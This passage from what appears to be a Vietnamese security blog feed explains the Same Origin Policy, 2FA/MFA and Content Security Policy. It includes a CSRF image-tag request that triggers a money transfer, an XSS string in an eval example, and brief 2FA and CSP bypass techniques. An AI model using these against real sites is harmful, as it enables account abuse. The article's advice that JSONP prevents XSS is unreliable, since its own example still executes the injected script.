tin cá nhân hóa (hay cụ thể hơn, là dữ liệu xác thực), dữ liệu nhạy cảm hoặc nguồn dữ liệu riêng tư của các Website khác.</p><h2 id="Same-Origin-Policy-hoat-dong-nhu-the-nao"><a href="#Same-Origin-Policy-hoat-dong-nhu-the-nao" class="headerlink" title="Same Origin Policy hoạt động như thế nào ?"></a>Same Origin Policy hoạt động như thế nào ?</h2><p>Đầu tiên, Policy sẽ xác định vào cái gì để xác định được rằng nó cùng nguồn gốc ( <strong>Origin</strong> ) ?</p><p>Nó sẽ dựa vào 3 yếu tố là :</p><ul><li>Host</li><li>Port</li><li>Scheme (Http/Https) </li></ul><p>Ví dụ bạn truy cập vào trang <a href="https://hydrasky.ml/hacking.html">https://hydrasky.ml/hacking.html</a>  bên dưới nó có những đoạn mã đang chạy, thì sẽ có loại trang Web nào khác mà các đoạn Code có thể tương tác với nó ?</p><ul><li><p><a href="http://hydrasky.ml/hacking.html">http://hydrasky.ml/hacking.html</a> : Không thể , bởi vì nó khác protocol (https#http)</p></li><li><p><a href="https://hydrasky.ml:8080/hacking.html">https://hydrasky.ml:8080/hacking.html</a>: Điều này còn phụ thuộc vào trình duyệt. Bình thường nó sẽ không thể vì nó khác Port (https mặc địch với port 443). Nhưng đối với trình duyệt IE thì nó không quan tâm đến Port thay vào đó nó dùng “Security Zone” nên với IE vẫn có thể tương tác.</p></li><li><p><a href="https://blog.hydrasky.ml/hacking.html">https://blog.hydrasky.ml/hacking.html</a> : Không thể , bởi vì dù là subdomain nhưng nó vẫn coi là khác host. Và  <a href="http://www.hydrasky.ml/">www.hydrasky.ml</a> cũng không được coi là ngoại lệ.</p></li><li><p><a href="https://example.com/">https://example.com</a> chắc chắn sẽ không thể rồi.</p></li><li><p><a href="https://hydrasky.ml/learning.html">https://hydrasky.ml/learning.html</a> mặc dù khác đường dãn nhưng nó vẫn đủ 3 tiêu chí nên có thể .</p></li></ul><h2 id="Cac-van-de-cua-Same-Origin-Policy"><a href="#Cac-van-de-cua-Same-Origin-Policy" class="headerlink" title="Các vấn đề của Same Origin Policy"></a>Các vấn đề của Same Origin Policy</h2><ol><li>SOP ngăn chặn quyền “read”  nhưng không thể can thiệp vào quyền “write” giữa các Origin khác nhau. Quyền “write” ở đây chính là gửi các request thực thi (như chuyển tiền, thay đổi tài khoản) tới các Origin khác. Đó chính là lí do nó không thể chống được một số trường hợp tấn công CSRF.<br>ví dụ:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;example.com&#x2F;trans.php?money&#x3D;1000&amp;reid&#x3D;1234 &gt;</span><br></pre></td></tr></table></figure></li></ol><p>Để ngăn chặn cross-origin “write” , bạn nên sử dụng CSRF token cho website của bạn.</p><ol start="2"><li>Bên cạnh việc tự định nghĩa các đoạn mã bên trong thẻ <code>&lt;script&gt;</code>, bạn còn có thể sử dung thuộc tính “src” để tải các đoạn mã từ các nơi khác trên Internet:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;”http:&#x2F;&#x2F;www.jslibrary.com&#x2F;script.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Điều này do script thuộc loại code (mã lập trình) chứ không phải là data (dữ liệu) nên không dẫn đến việc lộ lọt thông tin nhạy cảm. </p><ol start="3"><li>Cùng với vấn đề thứ 2, Với thuộc tính “src” bạn có thể sử dụng thoải mái các thư viện JavaScript như Jquery .Nhưng trong trường hợp bạn muốn lấy tài nguyên không phải là các mã code js thì sao ?<br>Ý mình ở đây chính là dữ liệu với định dạng JSON.<br>Khi bạn nhận được một chuỗi dưới dạng JSON, bạn cần phải chuyển nó sang dạng Object trước khi làm việc với nó bởi vì dữ liệu được gửi đi dưới dạng ký tự, không phải dưới dạng một đối tượng của JavaScript. Tiếp đây là mới điều cần lưu ý đó là bạn không nên làm việc trưc tiếp với dữ liệu định dạng JSON như ví dụ dưới đây:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var res &#x3D; ‘&#123;“author”: “hydrasky”, “title”: alert(xss), “rel_date”: “1&#x2F;07&#x2F;2020”&#125;’;</span><br><span class="line">&#x2F;&#x2F; Nguy hiểm </span><br><span class="line">var danger &#x3D; eval(&#39;(&#39;+res+&#39;)&#39;)</span><br><span class="line">&#x2F;&#x2F; Thay vào đo bạn nên làm như này sẽ an toàn</span><br><span class="line">var safe &#x3D; JSON.parse(res);</span><br></pre></td></tr></table></figure><p>Khuyến nghị khác ở đây là bạn nên dùng JSONP, viết tắt của <code>JSON with Padding</code>. JSONP giống với JSON, ngoại trừ dữ liệu được đặt bên trong một hàm JavsScript được gọi bởi Client gọi tới nó.</p><p>Hàm này nằm ở trên chính trang hiện tại và với tham số là dữ liệu json được lấy từ server.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mycallback &#x3D; function (data) &#123; </span><br><span class="line">  console.log (data) </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Và rồi bạn đặt cái này vào website của bạn:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src &#x3D; https:&#x2F;&#x2F;www.example.com&#x2F;data?callback&#x3D;mycallback &gt; &lt;&#x2F; script&gt; </span><br></pre></td></tr></table></figure><p>Bạn nhận được kết quả giống như này :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">mycallback(&#123;“author”: “hydrasky”, “title”: alert(xss), “rel_date”: “1&#x2F;07&#x2F;2020”&#125; &#x2F;&#x2F;JSONP</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>Như vậy bạn có thể tránh được một cuộc tấn công XSS rồi . Nhưng ở một khía cạnh nào đó, việc để dữ liệu ở dạng JSON cũng chính là một yếu tố dẫn đến bypass SOP. </p><ol start="4"><li>Trong trường hợp như bạn muốn cho phép các đoạn mã có thể tương tác với các subdomain khác. Ví dụ như ứng dụng web yêu đăng nhập tại một nơi như <a href="http://store.company.com/">http://store.company.com</a> nhưng cần xác thực tại <a href="http://login.company.com/">http://login.company.com</a> trước chẳng hạn. Bạn có thể  xử lí như sau:</li></ol><ul><li><strong>Thay đổi Origin</strong> :<br>Rõ ràng host của 2 website trên là khác nhau nên vi phạm SOP, chúng ta có thể thiết lập ở cả 2 nơi về cùng gốc bằng lệnh<br>document.domain = “company.com” - Domain chính ;</li><li><strong>Sử dụng Cross Origin Resource Sharing (CORS)</strong><br>Đây là một tính năng mới được tích hợp trong HTML5. CORS cho phép lấy dữ liệu từ một trang khác thông qua XMLHttpRequest. Lập trình viên cần thiết lập request gửi đi có trường<br>Origin: <a href="http://company.com/">http://company.com</a><br>Và trong response trả về cần có:<br>Access-Control-Allow-Origin: <a href="http://company.com/">http://company.com</a></li></ul><p>Đây là biện pháp hữu hiệu và an toàn hơn sử dụng JSONP hay thay đổi Origin nhưng yêu cầu cấu hình CORS thật chính xác, nếu không chính điều này sẽ cho phép attacker lấy đi dữ liệu của bạn . (MÌnh sẽ có bài viết về lỗ hổng này nha)</p><p>##Tổng kết</p><p>Ok , Như vậy với SOP giúp tăng tính bảo mật trên trình duyệt của người dùng nhưng vẫn chưa cao , tham khảo thêm <a href="http://powerofcommunity.net/poc2008/kuza55.pdf">Yếu điểm của SOP</a>.</p><div class="video-container"><iframe src="https://www.youtube.com/embed/UfYfID_r7-U" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p> Để cải thiện điều này có thể sử dụng SOP , CSP và CORS cùng nhau như thế sẽ rất an toàn cho phía Client  .  Qua bài viết này chúng ta có thể hiểu được phần nào việc giao tiếp giữa các Origin.<br>Cảm ơn các bạn đã đọc và theo dõi, đón chào các bạn ở các bài viết tiếp theo.</p><h2 id="Link-tham-khao"><a href="#Link-tham-khao" class="headerlink" title="Link tham khảo"></a>Link tham khảo</h2><ul><li><a href="https://web.dev/same-origin-policy/">https://web.dev/same-origin-policy/</a></li><li><a href="https://whitehat.vn/threads/same-origin-policy.4731/">https://whitehat.vn/threads/same-origin-policy.4731/</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy</a></li><li><a href="https://medium.com/@minosagap/same-origin-policy-and-ways-to-bypass-250effdc4a12">https://medium.com/@minosagap/same-origin-policy-and-ways-to-bypass-250effdc4a12</a></li><li><a href="https://www.acunetix.com/blog/web-security-zone/what-is-same-origin-policy/">https://www.acunetix.com/blog/web-security-zone/what-is-same-origin-policy/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;TL;DR&lt;br&gt;Xin chào các bạn, trong bài viết trước mình có giới thiệu với các bạn về  Content Security Policy (CSP) ,hôm nay mình sẽ giới th
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Two-Factor Authentication &amp; Multil-Factor Authentication</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/Authentication/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/Authentication/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[ <img src="/images/OAUTH/si-advanced-authentication-feature.webp" class="[class names]" title="[300] [200] " alt="Xác thực đa yếu tố"><p>Xin chào các bạn , trong bài viết này mình sẽ giới thiệu về 2 phương thức bảo mật được ưa dùng hiện nay, cách thức hoạt động và mức độ quan trọng hay ảnh hướng như nào đến người dùng khi không dùng hay bị bypass.</p><p>Như các bạn đều biết việc xác thực cổ điển là dựa vào user/password (hay Basic Authentication) là một phương thức đã lỗi thời và rất dễ bị bẻ khóa.  Cùng với đó người dùng thường có thói quen dùng một mật khẩu cho nhiều tài khoản hay sử dụng mật khẩu đơn giản để dễ nhớ. Dẫn đến việc kể tấn công có thể đoán ra hay sử dụng các công cụ để thực hiện cuộc tấn công bruteforce hoặc diretory attack chiếm lấy tài khoản một cách dễ dàng. Vì vậy điều cần thiết được đặt ra  là cung cấp cho người dùng những cách bổ sung để bảo vệ tài khoản của họ.</p><p>Xác thực hai yếu tố hay đa yếu tố (2FA hoặc MFA) là phương thức bảo mật mới đã được bổ sung vào quá trình xác thực  và ngày càng trở nên phổ biến.Vậy 2FA và MFA là gì và chúng có thể giúp bảo vệ người dùng như thế nào?</p><img src="/images/OAUTH/askaquestion_image.jpg" class="[class names]" title="[500] [500] " alt="2FA VS MFA"><p>Two-Factor (2FA) và Multi-Factor Authentication hay còn gọi là Bảo mật nhiều lớp, là một phương thức để chứng thực user bằng việc combine 2 hoặc nhiều hơn các factors khác nhau.</p><p>Bản chất Two-Factor Authentication (2FA) - cũng được coi là Multi-Factor authentication (MFA) nhưng MFA lại không phải là 2FA, Tại sao lại vậy ???</p><img src="/images/OAUTH/ss.jpg" class="[class names]" title="[500] [500] " alt="Oauth2"><p>Sự khác biệt dễ thấy nhất giữa xác thực đa yếu tố và xác thực hai yếu tố là 2FA chỉ sử dụng hai trong số các yếu tố có sẵn để xác minh danh tính người dùng, trong khi MFA có thể sử dụng ba hoặc nhiều hơn để kiểm tra.</p><p>Xét về tính bảo mật, mặc dù 2FA hiện vẫn đang là phương thức xác thực rất là hữu hiệu nhưng không phải là an toàn thực sự. Đã có rất nhiều cách bypass 2FA  được thực hiện, mặc dù hầu hến đến từ việc cấu hình của người quản trị hoặc đôi khi từ chính sự thiếu hiểu biết từ người dùng nhưng rõ ràng rằng 2FA không còn đủ để ngăn chặn hoàn toàn các vi phạm dữ liệu và đó là lí do sinh ra MFA. MFA không chỉ sử dụng nhiều yếu tố xác thực có sẵn mà nó còn bổ sung thêm các yếu tố  theo ngữ cảnh như thời gian,vị trí …</p><figure class="wp-block-image"><img src="https://image.slidesharecdn.com/smspasscode-141101172311-conversion-gate02/95/welcome-to-the-3rd-generation-in-user-authentication-7-638.jpg?cb=1414931604" alt="Welcome to the 3rd generation in user authentication"/></figure><p>Oh như  vậy tại sao vẫn sử dụng 2FA khi đã có MFA ? Dễ hiểu thôi , nhiều xác thực hơn có nghĩa là bảo mật hơn nhưng sẽ phức tạp hơn ,người dùng có thể thấy rất khó chịu với việc này nên các ứng dụng nhỏ và vừa thường sử dụng 2FA cùng với các yếu tố xác thực  mức độ tốt hơn thay vì sử dụng nhiều yếu tố để xác thực như MFA. Còn với các ông lớn như Facebook, Google … đều đã áp dụng MFA cho người dùng tùy chọn và MFA rất cần thiết cho lưu trữ đám mây (Cloud).</p><h2>Các yếu tố xác thực chính</h2><figure class="wp-block-image"><img src="https://www.secsign.com/wp-content/uploads/2017/08/2FA-icon.png" alt="Two-Factor Authentication (2FA) vs. Two-Step Authentication (2SA ..."/></figure><p>Nếu không dựa vào mật khẩu vậy phương thức này sẽ sử dụng điều gì để xác thực ? Có thể kể đến 4 yếu tố :</p><h4>Kiến thức hay sự hiểu biết</h4><p>Ví dụ là sử dụng tính năng xác thực bằng bạn bè , như zalo sẽ yêu cầu bạn chọn dúng 3 tài khoản  trong danh sách bạn bè để xác thực đó chính là bạn. Kiến thức ở đây là một cái gì đó nằm trong kiến thức liên quan đến tài khoản của người dùng.Đây có thể là mật khẩu, tên người dùng,bạn bè, câu trả lời cho câu hỏi bảo mật mà bạn đặt sẵn, mã PIN hoặc địa chỉ. </p><h4>Sở hữu</h4><p>Loại yếu tố xác thực này đề cập đến thứ mà người dùng sở hữu, thiết bị (chỉ cho phép đăng nhập  ở điện thoại hoặc máy tính của bạn )hoặc đối tượng sẽ cung cấp thêm thông tin cần thiết để xác minh (email, sdt) . Ví dụ như mã OTP được gửi qua SMS hoặc các ừng dụng token, token secret qua email…</p><img src="/images/OAUTH/tpbank-etoken.jpg" class="[class names]" title="[400] [400] " alt="Software tokens"><h4>Cố Hữu (Vốn có)</h4><p>Đây là những yếu tố liên quan đến người dùng và thường là các phương pháp sinh trắc học như nhận dạng vân tay , khuôn mặt , giọng nói hoặc mống mắt . </p><h4>Vị trí</h4><p>Mặc dù yếu tố xác thực vị trí có thể không được sử dụng thường xuyên như các yếu tố khác, tuy nhiên nó vẫn tạo thành một yếu tố để xác thực hữu hiệu.Theo định nghĩa, nó đề cập đến bạn đang ở đâu.Vị trí của bạn được theo dõi và xác định bằng các công nghệ khác nhau theo dõi địa chỉ IP của bạn và họ thông báo cho bạn nếu họ phát hiện ra việc truy cập ở một vị trí bất thường (VD: bạn ở HN nhưng tài khoản lại được truy cập ở HCM) .Xác định vị trí của bạn cũng có thể được thực hiện bằng địa chỉ MAC hoặc thiết bị có trình theo dõi GPS.</p><h2>Cơ chế hoạt động internally của 2FA</h2><p>Khi bạn enable 2FA cho tài khoản của mình,mỗi lần yêu cầu xác thực 2fa, bạn sẽ nhận được một secret key based 32. Tùy vào mức độ security, độ dài của secret key có thể là 80, 128 hoặc 160 bit.</p><p>Các authenticator application sẽ scan secret này dưới dạng QR code (hoặc manually) và dùng nó để generate ra một HMAC-SHA1. Chuỗi HMAC này có thể là một trong 2 dạng:</p><ul><li><a href="https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm">TOTP</a></li><li><a href="https://en.wikipedia.org/wiki/HMAC-based_One-time_Password_algorithm">HOTP</a></li></ul><p>Sau đó HMAC này sẽ được extracted và lấy ra 1 số int 4 byte, đó chính là code.</p><p>Một mã code sẽ valid trong 30 giây. Tuy nhiên không phải ai cũng có clock synced giống nhau, vì network latency các kiểu nên thường mọi người hay cho phép ở phạm vi cộng trừ 1 code, tức là 1 code sẽ valid trong 1 phút 30 giây. Điều này có thể giảm tính an toàn, nhưng lại tăng sự trải nghiệm đáng kể.</p><h3>Backup codes</h3><p>Backup codes hay recovery codes sẽ được sử dụng trong trường hợp bạn không thể sử dụng điện thoại, bạn có thể dùng chúng để đăng nhập. Có 2 loại backup codes:</p><ul><li>Multiple backup codes: Ví dụ github sẽ cho bạn 10 codes, và mỗi code sẽ được sử dụng 1 lần.</li><li>Single backup code: Bạn dùng cái code này đồng nghĩa với việc bạn có thể đăng nhập, nhưng phải setup lại 2FA (nó assume bạn bị mất điện thoại).</li></ul><h3>Quy trình xác thực bằng 2FA</h3><div class="video-container"><iframe src="https://www.youtube.com/embed/0mvCeNsTa1g" frameborder="0" loading="lazy" allowfullscreen></iframe></div><p>Dưới đây là cách xác thực 2FA hoạt động:</p><ol><li>Người dùng được nhắc đăng nhập bằng ứng dụng hoặc trang web.</li><li>Người dùng nhập những gì họ biết -  username/password ,email .Sau đó, máy chủ của trang web tìm thấy kết quả hợp lệ và định danh người dùng.</li><li>Trang web sau đó sẽ sử dụng các yếu tố sở hữu duy nhất  như email, sdt có liên kết với tài khoản của người dùng  để gửi one time code dưới dạng một token hoặc text message.</li><li>Sau đó, người dùng nhập mã một lần được tạo trong bước 3.</li><li>Sau khi cung cấp cả hai yếu tố, người dùng được xác thực và cấp quyền truy cập vào ứng dụng hoặc trang web.</li></ol><h3> **Bypass xác thực ** 2FA</h3><p>Dưới đây là  một số cách thồng thường mà các hacker hay sử dụng để vượt qua phương thức bảo mật này  :</p><ul><li>Burteforce : Nó là biện pháp phổ biến và hay dùng nhất do các code thường chỉ có từ 3 dến 6 kĩ tự và hầu như chỉ là số. Vì vậy nếu khồng có giới hạn request thì việc sử dụng bruteforce tỷ lệ  thành công rất là cao.</li><li>Race conditions: Bằng việc sử dụng đồng thời nhiều request cùng một thời điểm khiến server không kịp xử lí đãn đến tạo ra các giá trị code đã sử dụng trước đó hoặc chưa sử dụng tại một thời điểm sau đó. Và kẻ tấn công có thể tái sử dụng nó. </li><li>Via Oauth: Tích hợp Oauth là một cơ chế đăng nhập của bên thứ ba cho phép người dùng đăng nhập bằng tài khoản bên thứ ba.Để bypass, kẻ tấn công phải có quyền truy cập vào tài khoản tích hợp Oauth để đăng nhập thay vì dùng tài khoản trực tiếp của người dùng.</li><li>Via session management :Phương pháp này dựa vào việc bỏ qua cơ chế xác thực hai yếu tố bằng cách sử dụng các chức năng như đặt lại mật khẩu, Về cơ bản,ngay sau khi sử dụng token để đặt lại mật khẩu nó sẽ  duy trì một phiên với ứng dụng  , dẫn đến việc bypass.</li></ul><p>Ngoài ra còn rất nhiều cách khác đến từ vấn đề logic flow, người dùng … Bạn có thể tham khảo từ writeup, tip/trick của các hacker , bughunter …</p><figure class="wp-block-image"><img src="https://pbs.twimg.com/media/EW8vBWEX0AAxcVj?format=jpg&name=large" alt="Image"/></figure><p>Một tip bypass 2FA từ <a rel="noreferrer noopener" href="https://twitter.com/hackerscrolls/status/1256276376019230720/photo/1" target="_blank">@hackerscrolls</a></p><p>Ok kết luận lại, với 2FA va MFA việc bảo mật sẽ tốt hơn rất nhiều nhưng yếu tố quan trọng nhất vẫn phụ thuộc vào con người. So với 2FA, thì MFA sẽ cố phần nhỉnh hơn về độ an toàn nhưng lại phức tạp, khá tốn chi phí, thời gian xác thực  vì vậy nên áp dụng mỗi phương thức vào môi trường hợp lệ. </p><p>Cảm ơn các bạn đã đọc bài. Xin chào và hẹn gặp lại !!!   </p><h2>Tham khảo </h2><ul><li><a href="https://en.wikipedia.org/wiki/Multi-factor_authentication">https://en.wikipedia.org/wiki/Multi-factor_authentication</a></li><li><a href="https://kipalog.com/posts/Two-Factor-Authentication-va-ung-dung">https://kipalog.com/posts/Two-Factor-Authentication-va-ung-dung</a></li><li><a href="https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f">https://shahmeeramir.com/4-methods-to-bypass-two-factor-authentication-2b0075d9eb5f</a></li><li><a href="https://securitytrails.com/blog/two-factor-auth-vs-multi-factor-auth">https://securitytrails.com/blog/two-factor-auth-vs-multi-factor-auth</a></li><li><a href="https://www.loginradius.com/blog/2019/06/what-is-multi-factor-authentication/">https://www.loginradius.com/blog/2019/06/what-is-multi-factor-authentication/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
         &lt;img src=&quot;/images/OAUTH/si-advanced-authentication-feature.webp&quot; class=&quot;[class names]&quot; title=&quot;[300] [200] &quot; alt=&quot;Xác thực đa yếu tố&quot;&gt;

&lt;p&gt;X
      
    
    </summary>
    
    
      <category term="Technology" scheme="http://blog.hydrasky.ml/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>Content Security Policy</title>
    <link href="http://blog.hydrasky.ml/2020/06/14/CSP/"/>
    <id>http://blog.hydrasky.ml/2020/06/14/CSP/</id>
    <published>2020-06-14T04:00:00.000Z</published>
    <updated>2020-06-14T04:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2> **Content Security Policy(CSP) làgì?** </h2><p>Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng.CSP là biện pháp đối phó rất hiệu quả với các cuộc tấn công Cross Site Scripting (XSS) và các kiểu injection tương tự.</p><figure class="wp-block-image"><img src="https://datahouse.asia/wp-content/uploads/2020/04/content-security-policy-1024x414.png" alt="Does Security Matter to Front End Developers and Tips To Not Get ..."/></figure><p>Tưởng tượng một chút, chúng ta ó 2 hướng cho các cuộc tấn công chèn script độc hại vào các website, đó là thông qua:</p><ul><li>Inline Script: attacker đặt script của chúng trực tiếp vào trang web của bạn</li><li>Trình duyệt sẽ Load script từ các domain khác (của attacker) trên website đang truy cập .</li></ul><p>Với hướng thứ 2,  attacker ưa dùng hơn vì dễ dàng truền tải script độc hại và có thể tùy ý thay đổi nội dung của script mà trình duyệt load. Nó có thể thay đổi trang web mà không cần tương tác.</p><!-- wp:image {"id":316,"sizeSlug":"large"} --><img src="/images/CSP/image-1.png" class="[class names]" title="[500] [500] " alt="title text"><p>Nhiệm vụ của CSP lúc này là không cho phép trình duyệt load script từ domain khác ,như thế kế hoạch của attacker sẽ bị hỏng. Vậy CSP đã làm thế nào ? </p><h2> **Cách hoạt động củaSCP** </h2><p>Bằng cách sử dụng các chỉ thị của CSP phù hợp ở trong các tiêu đề phản hồi HTTP, bạn có thể chọn lọc, chỉ định nguồn dữ liệu nào sẽ được phép sử dụng trong ứng dụng web của mình. Ví dụ như:</p><ul><li>Chỉ định thực thi script đến từ domain của mình (ví dụ: mydomain.com)</li><li>Chỉ định thực thi các script đến từ một domain khác đáng tin cậy hay subdomain (ví dụ: * .mydomain.com, google.com)</li><li>Chỉ định chỉ thực thi tệp duy nhất mydomain.com/script.min.js</li><li>Không thực thi bất kì mã JavaScript nào</li><li>Chỉ hiển thị hình ảnh đến từ cdn.securecdn.com</li></ul><p>Cách chỉ định chính sách , đó là thêm header HTTP dưới đây vào repsonse , nó có dạng là</p><p>Content-Security-Policy: [chinh sách]</p><!-- wp:image {"id":311,"sizeSlug":"large"} --><img src="/images/CSP/image-2.png" class="[class names]" title="[500] [500] " alt="title text"><p>Để viết chính sách,bạn cần biết các chỉ thị cho các đối tượng</p><!-- wp:image {"id":312,"sizeSlug":"large"} --><img src="/images/CSP/image-3.png" class="[class names]" title="[500] [500] " alt="title text"><p>Ví dụ như img-src áp dụng các hình ảnh được hiển thị trên trang web, nó sẽ chỉ định nguồn hình ảnh đươc phép lấy về, default-src đóng vai trò dự phòng để tìm nạp CSP khác nếu nó bị thiếu . Để biết thêm và chi tiết các chỉ thị các bạn có thể tham khảo nội <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank">ở đây</a>  .</p><p>Cùng với các chị thị còn có các thuộc tính của các chỉ thị hoặc có thể gọi là các keywords/values bổ trợ, Ví dụ như :</p><ul><li>"none" không cho phép các đối tượng liên quan đến chỉ thị được thực thi.</li><li>"self " cho phép thực thi đối với domain của bạn (ko tính subdomain) hoặc những domain được chỉ định.</li><li>"unsafe-inline" cho phép thực thi các đoạn mã CSS hoặc Javascript được nhúng trực tiếp vào mã nguồn. Thiết lập này không được khuyến khích sử dụng nhưng trong nhiều trường hợp chúng ta vẫn phải dùng đến.</li><li>"unsafe-eval" cho phép chạy hàm eval(), đây là một hàm khá nguy hiểm của Javascript.</li><li>"*" áp dụng cho tất cả ví dụ như 'Https: // *' sẽ cho phép tất cả các tài nguyên đang truyền tải qua HTTPS.</li></ul><p>Bạncóthểthamkhảothêm<a rel="noreferrer noopener" href="https://content-security-policy.com/" target="_blank">ở đây</a></p><h3> **VÍ DỤ MỘT VÀI CHÍNH SÁCH** </h3><p>CSP chỉ cho phép JavaScript , cái mà được lưu trữ trong trang web của bạn</p><p>Content-Security-Policy: script-src ‘self’</p><p>Cho phép các các nội dung thuộc domain và subdomain của example.com và được truyền tải thông qua cả 2 giao thức http , https</p><p>Content-Security-Policy: default-src <em>://</em>.example.com  </p><p>Chỉ cho phép JavaScript , cái mà được lưu trữ trên trang web của bạn và cdn.trustyorigin.net nhưng hình ảnh thì ở bất kì chỗ nào</p><p>Content-Security-Policy: script-src ‘self’ cdn.trustedorigin.net; img-src *; </p><p>Chặn tất cả các form submit</p><p>Content-Security-Policy form-action ‘none’; </p><p>Chỉ cho phép thực thi js trong tập tin script.js trên <a href="https://trustyorigin.net/">https://trustyorigin.net/</a> và mặc định các giá trị của child-src, connect-src, font-src, frame-src, img-src, manifest-src, media-src, media-src, object-src, script-src, style-src và worker-src đều là self - các nội dung liên quan đến chỉ thị đều lấy từ nguồn của URL hiện tại</p><p>Content-Security-Policy default-src ‘self’; script-src <a href="https://trustedorigin.net/script.js">https://trustedorigin.net/script.js</a>; </p><h2> **TriểnkhaiCSP** </h2><p>Để triển khai CSP, ta cần định cấu hình máy chủ web của mình để trả về Content-Security-Policy header HTTP (đôi khi bạn sẽ thấy nó với header X-Content-Security-Policytiêu đề, nhưng đó là phiên bản cũ hơn và bây giờ không cần đề cập đến nó nữa). Ví dụ: nếu bạn sử dụng Apache, bạn có thể xác định CSP trong tệp httpd.conf , Virtualhost hoặc .htaccess của trang web của bạn.</p><img src="/images/CSP/image-4.png" class="[class names]" title="[500] [500] " alt="title text"><p>Ngày nay ,CSP cũng được hỗ trợ bởi tất cả các trình duyệt hiện đại  và đã được nhiều năm chỉ riêng không được hỗ trợ trong Internet Explorer, nó chỉ dùng sandbox.</p><img src="/images/CSP/image-6.png" class="[class names]" title="[500] [500] " alt="Level ở đây các bạn có thể hiểu như là thế hệ của CSP"><p>Ngoài ra cấu hình trên server, bạn cũng có thể cung cấp các chỉ thị cụ thể bằng cách sử dụng thẻ <meta>- thẻ HTML , được gọi là CSP Page-level. Dưới đây, một ví dụ đặt ra chính sách tương tự như trên:</p><meta http-equiv="Content-Security-Policy" content="default-src 'self' "> <p>Để sử dụng các chỉ thị này sẽ cần đến Sanboxing của trình duyệt</p><p>Một vấn đề nữa, nếu như các trình duyệt không hỗ trợ CSP nó vẫn hoạt động với các máy chủ triển khai nó và ngược lại, các trình duyệt không hỗ trợ CSP chỉ cần bỏ qua nó, hoạt động như bình thường, và mặc định Same-origin là policy cho nội dung web. Nếu trang web không cung cấp CSP header , các trình duyệt cũng sử dụng Same-origin làm policy .</p><h2>Bypass CSP</h2><p>Có lẽ đây là mục mà ae pentest yêu thích nhất, bất kì phương thức bảo mật nào đều có lỗ hổng và CSP cũng không ngoại lệ. CSP giống như whitelist, vì vậy đôi lúc nó sẽ khổng thể đáp ứng được toàn bộ ưu cầu về các tính bảo mật. Các bạn có thểm tham khảo các bài viết dưới đây :</p><ul><li><a href="http://blog.innerht.ml/csp-2015/">"CSP 2015". XSSJigsaw.RetrievedDecember12, 2015.</a></li><li><a href="http://sebastian-lekies.de/csp/bypasses.php">Lekies,Sebastian. "CollectionofCSPbypasses".Retrieved2017-06-05.</a></li><li><a href="http://www.slideshare.net/x00mario/an-abusive-relationship-with-angularjs">"AnAbusiveRelationshipwithAngularJS".RetrievedJanuary5, 2016.</a></li><li><a href="https://www.youtube.com/watch?v=p07acPBi-qw">OWASP (2017-05-25),AppSecEU 2017Don'tTrustThe DOM:BypassingXSSMitigationsViaScriptGadgetsbySebastianLekies,retrieved2017-06-05</a></li><li><a rel="noreferrer noopener" href="https://portswigger.net/research/bypassing-csp-with-policy-injection" target="_blank">https://portswigger.net/research/bypassing-csp-with-policy-injection</a></li><li><a rel="noreferrer noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/" target="_blank">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/</a></li><li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></li></ul><p>Ngay từ đầu mk cũng đề cập , CSP giúp giảm thiểu các cuộc tấn công xss và các kiểu tấn công tương tự nhưng nó lại không có tác dụng một người ae họ hàng gần với nó là HTML injection.  Bạn có thể tham khảo chi tiết <a rel="noreferrer noopener" href="https://blog.detectify.com/2019/07/11/content-security-policy-csp-explained-including-common-bypasses/" target="_blank">ở đây</a>  và xem bài thuyết trình về CSP (Tóm tắt một chút cho các bạn đó là anh Matt Brunt đã trình bày các khái niệm, mối đe dọa từ xss, triển khai CSP một cách hợp lí để vừa ngăn ngừa tấn công vừa tránh bị phá hỏng web site bởi chính CSP, và cuối cùng đó là các vấn đề và 